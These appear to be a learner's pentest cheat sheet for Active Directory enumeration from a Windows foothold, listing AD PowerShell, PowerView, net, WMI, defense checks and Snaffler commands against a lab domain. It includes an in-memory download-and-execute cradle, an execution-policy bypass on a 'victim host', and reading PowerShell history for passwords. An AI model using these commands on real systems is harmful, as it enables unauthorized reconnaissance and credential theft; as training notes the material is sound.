### ActiveDirectory PowerShell Module
```
Import-Module ActiveDirectory
```

Use Get-Module to view available modules.
```
Get-ADDomain
```

Check for accounts with the ServicePrincipalName property populated.
```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

Group Enumeration
```
Get-ADGroup -Filter * | select name
```

Detailed Group Info
```
Get-ADGroup -Identity "Backup Operators"
```

Get users inside that group
```
Get-ADGroupMember -Identity "Backup Operators"
```

Query a user by it's SUID
```
Get-ADUser -Filter "ObjectSid -eq 'S-1-5-21-...'"   
```

### PowerView
PowerView it's located at /usr/share/windows-resources/powersploit/Recon
First import the module:
```
Import-Module .\PowerView.ps1
```

Domain User Information
```
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```

Testing for Local Admin Access
```
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```

Finding Users With SPN Set
```
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

### Living Off the Land
#### Net Commands
Information about password requirements
```
net accounts
```
Password policy and lockout policy
```
net accounts /domain
```
Information about domain groups
```
net group /domain
```
List users with domain admin privileges
```
net group "Domain Admins" /domain
```




#### Environmental Commands
| **Command**                                             | **Result**                                                                                 |
| ------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| `hostname`                                              | Prints the PC's Name                                                                       |
| `[System.Environment]::OSVersion.Version`               | Prints out the OS version and revision level                                               |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host                                        |
| `ipconfig /all`                                         | Prints out network adapter state and configurations                                        |
| `set`                                                   | Displays a list of environment variables for the current session (ran from CMD-prompt)     |
| `echo %USERDOMAIN%`                                     | Displays the domain name to which the host belongs (ran from CMD-prompt)                   |
| `echo %logonserver%`                                    | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |
#### Harnessing PowerShell
| **Cmd-Let**                                                                                                                | **Description**                                                                                                                                                                                                                               |
| -------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-Module`                                                                                                               | Lists available modules loaded for use.                                                                                                                                                                                                       |
| `Get-ExecutionPolicy -List`                                                                                                | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.                                         |
| `Set-ExecutionPolicy Bypass -Scope Process`                                                                                | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-ChildItem Env: \| ft Key,Value`                                                                                       | Return environment values such as key paths, users, computer information, etc.                                                                                                                                                                |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`                                 | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.                       |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | This is a quick and easy way to download a file from the web using PowerShell and call it from memory.                                                                                                                                        |

#### Checking Defenses
Firewall Checks
```
netsh advfirewall show allprofiles
```

Windows Defender Check (from CMD.exe)
```
sc query windefend
```
Above, it checks if Defender is running. Below will check status and configuration settings.
```
Get-MpComputerStatus
```
Logged in users.
```
qwinsta
```

#### Windows Management Instrumentation (WMI)
#### Quick WMI checks
Information about patch level.
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
Listing processes
```
wmic process list /format:list
```
Domain and Domain Controllers Information
```
wmic ntdomain list /format:list
```
Local accounts and Domain accounts that have logged into the device.
```
wmic useraccount list /format:list
```
Information about all local groups.
```
wmic group list /format:list
```
System Accounts that are being used as service accounts.








### Shares
Snaffler Execution
```
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```
Some interesting switches to experiment with:
**-i** Disables computer and share discovery, requires a path to a directory in which to perform file discovery.
**-b** Skips the LAIM rules that will find less-interesting stuff, tune it with a number between 0 and 3. (I don't know what is LAIM)
